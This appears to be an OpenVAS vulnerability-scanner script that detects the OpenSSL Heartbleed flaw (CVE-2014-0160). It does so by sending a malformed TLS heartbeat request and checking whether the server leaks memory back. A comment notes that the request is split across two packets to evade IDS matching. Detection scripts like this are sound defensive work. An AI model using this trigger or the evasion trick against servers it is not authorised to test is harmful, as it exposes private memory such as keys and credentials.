###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openssl_heartbeat_66690.nasl 13754 2019-02-19 10:35:55Z cfischer $
#
# SSL/TLS: OpenSSL TLS 'heartbeat' Extension Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103936");
  script_version("$Revision: 13754 $");
  script_bugtraq_id(66690);
  script_cve_id("CVE-2014-0160");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-19 11:35:55 +0100 (Tue, 19 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-04-09 09:54:09 +0200 (Wed, 09 Apr 2014)");
  script_name("SSL/TLS: OpenSSL TLS 'heartbeat' Extension Information Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_family("SSL and TLS");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_tls_version_get.nasl");
  script_mandatory_keys("ssl_tls/port");

  script_xref(name:"URL", value:"https://www.openssl.org/news/secadv/20140407.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/66690");
  script_xref(name:"URL", value:"http://openssl.org/");

  script_tag(name:"impact", value:"An attacker can exploit this issue to gain access to sensitive
  information that may aid in further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted TLS request and check the response.");

  script_tag(name:"insight", value:"The TLS and DTLS implementations do not properly handle
  Heartbeat Extension packets.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"OpenSSL is prone to an information disclosure vulnerability.");

  script_tag(name:"affected", value:"OpenSSL 1.0.1f, 1.0.1e, 1.0.1d, 1.0.1c, 1.0.1b, 1.0.1a, and
  1.0.1 are vulnerable.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("mysql.inc"); # For recv_mysql_server_handshake() in open_ssl_socket()
include("misc_func.inc");
include("byte_func.inc");
include("ssl_funcs.inc");

function _broken_heartbeat( version, vtstring ) {

  local_var version, vtstring;
  local_var hb, payload;

  if( ! version )
    version = version = TLS_10;

  payload = raw_string( 0x01 ) + raw_string( 16384 / 256, 16384 % 256 ) + crap( length:16 ) + '------------------------->' + vtstring + '<-------------------------';
  hb = version + data_len( data:payload ) + payload;
  return hb;
}

function test_hb( port, version, vtstring ) {

  local_var port, version, vtstring;
  local_var soc, hello, data, record, hello_done, v, hb, d;

  soc = open_ssl_socket( port:port );
  if( ! soc )
    return FALSE;

  hello = ssl_hello( version:version, extensions:make_list( "heartbeat" ) );
  if( ! hello ) {
    close( soc );
    return FALSE;
  }

  send( socket:soc, data:hello );

  while ( ! hello_done ) {
    data = ssl_recv( socket:soc );
    if( ! data ) {
      close( soc );
      return FALSE;
    }

    record = search_ssl_record( data:data, search:make_array( "handshake_typ", SSLv3_SERVER_HELLO ) );
    if( record ) {
      if( record['extension_heartbeat_mode'] != 1  ) {
        close( soc );
        return;
      }
    }

    record = search_ssl_record( data:data, search:make_array( "handshake_typ", SSLv3_SERVER_HELLO_DONE ) );
    if( record ) {
      hello_done = TRUE;
      v = record["version"];
      break;
    }
  }

  if( ! hello_done ) {
    close( soc );
    return FALSE;
  }

  # send heartbeat request in two packets to
  # work around stupid IDS which try to detect
  # attack by matching packets only
  hb = _broken_heartbeat( version:version, vtstring:vtstring );

  send( socket:soc, data:raw_string( 0x18 ) );
  send( socket:soc, data:hb );

  d = ssl_recv( socket:soc );

  if( strlen( d ) > 3 && string( "->", vtstring, "<-" ) >< d ) {
    security_message( port:port );
    exit( 0 );
  }

  if( soc )
    close( soc );

  return;
}

port = get_ssl_port();
if( ! port )
  exit( 0 );

if( ! versions = get_supported_tls_versions( port:port, min:SSL_v3, max:TLS_12 ) )
  exit( 0 );

vt_strings = get_vt_strings();
foreach version( versions ) {
  test_hb( port:port, version:version, vtstring:vt_strings["default"] );
}

exit( 99 );